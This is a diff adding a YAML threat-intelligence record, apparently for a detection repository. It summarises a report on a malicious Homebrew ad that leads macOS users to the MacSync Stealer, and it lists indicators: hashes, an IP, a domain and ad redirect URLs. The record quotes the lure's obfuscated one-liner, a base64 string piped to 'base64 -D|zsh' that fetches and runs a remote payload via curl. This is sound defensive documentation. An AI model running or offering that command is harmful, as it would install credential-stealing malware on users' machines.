@@ -1,0 +1,39 @@
+title: Malicious Ad for Homebrew Leads to MacSync Stealer
+description: Malicious ads targeting macOS hosts lead to the installation of MacSync
+  Stealer malware through a fake Homebrew page.
+attribution: ''
+malware_families:
+- MacSync Stealer
+cves: []
+ttps:
+  processes: []
+  command_lines: []
+  powershell: []
+  scripts:
+  - echo 'ZWNobyAnVmYxaWZpYWIuIHBSZWFzZSB3YW16LjAmJiBjdXJsIC1rZnNTTCBodHRWOi8vZ2xvd211ZGF1c3RoaWNzLmNvbS9jdXJwLzYzODExZThiNDc4NTc1ZjNiMmM2YzQ2MTYwYzFmZDMzOGIyMTNmYjFiYjAuNjRiNjM3ZHx6c2g='|base64
+    -D|zsh [l] .'
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - glowmedaesthetics[.]com -> 104.21.80.251:80
+  file_activity:
+  - /tmp/osalogging.zip
+  persistence: []
+  process_relations: []
+iocs:
+  hashes:
+  - a4fcfecc5ac8fa57614b23928a0e9b7aa4f4a3b2b3a8c1772487b46277125571
+  - 0d58616c750fc8530a7e90eee18398ddedd08cc0f4908c863ab650673b9819dd
+  - 86d0c50cab4f394c58976c44d6d7b67a7dfbbb813fbcf622236e183d94fd944f
+  ip_addresses:
+  - 104.21.80.251
+  domains:
+  - glowmedaesthetics[.]com
+  urls:
+  - hxxps://www.google[.]com/aclk?sa=L&ai=DChsSEwi24vK_v5aUAxXZS38AHRAFIWAYACICCAIQABoCb2E&co=1&gclid=EAIaIQobChMItuLyv7-WlAMV2Ut_AB0QBSFgEAMYASAAEgKrq_D_BwE&cid=CAASugHkaEZtQvhFJBWvSVo_oMtlq6lKBxptjJBacaXOdzM28vxFNm3V2vrefacF48NMD0YvBIV9PCmn_d6X0uiMYDt5bwJYXaT6Lt7Mf3F-Mc3OK-0ugNt4GfcvQ0lOKkP1Sf8WVDXTMPeVMsHE8qxoG43Ta5BRER_Sre0RfChP39oVqtwRkowlKUUojM12uBAYWvejqokVOa_j7-uGyN1XrQ1ae6Tfaijfc9OvMC9QKQovm7p0DBitWtBJ_d4&cce=1&sig=AOD64_2EqeARnVjOoYvCwtJyl1AsolQe7g&q&adurl&ved=2ahUKEwjyq-2_v5aUAxU3g2oFHc28JOUQ0Qx6BAhnEAE
+  - hxxps://sites.google[.]com/view/brewpage?gad_source=1&gad_campaignid=23806351087&gbraid=0AAAAACJ6-Kb3hWjjAWCyYLIj0YO5oQvtp&gclid=EAIaIQobChMItuLyv7-WlAMV2Ut_AB0QBSFgEAMYASAAEgKrq_D_BwED
+authors:
+- Bradley Duncan
+reference: https://isc.sans.edu/forums/diary/Malicious+Ad+for+Homebrew+Leads+to+MacSync+Stealer/32942
+date_of_publication: May 01, 2026
+file_creation_date: May 01, 2026
